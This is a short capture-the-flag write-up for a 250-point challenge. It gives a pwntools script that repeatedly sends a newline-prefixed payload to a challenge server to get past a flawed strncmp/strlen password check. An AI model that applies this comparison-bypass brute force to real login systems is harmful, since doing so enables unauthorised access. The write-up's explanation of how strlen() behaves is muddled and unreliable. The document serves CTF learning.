# Are U Random? [250 points] (6 solves)

```python
from pwn import *

context.log_level = 'error'

def exploit():
    try:
        p = remote('chal.firebird.sh', 33004)
        p.recvuntil(b'attempt.')

        for _ in range(10):
            p.send(b'\n' + b'A' * 127)
            response = p.recvline()
            if b'Welcome!' in response:
                print(response.decode().strip())
                p.close()
                return True
            p.recv()
        p.close()
        return False
    except Exception:
        return False


while True:
    if exploit():
        break
```
The server generates random passwords and gives us 10 attempts to guess the password correctly. The exploitation here is using `strlen()` as the comparison length in `strncmp()`. When a string start with a newline character, such that `\n`, `strlen()` only return 1 since it counts characters until it hits a null byte.\
Therefore, we can do here is keep sending payload that start with `\n` until get the flag.
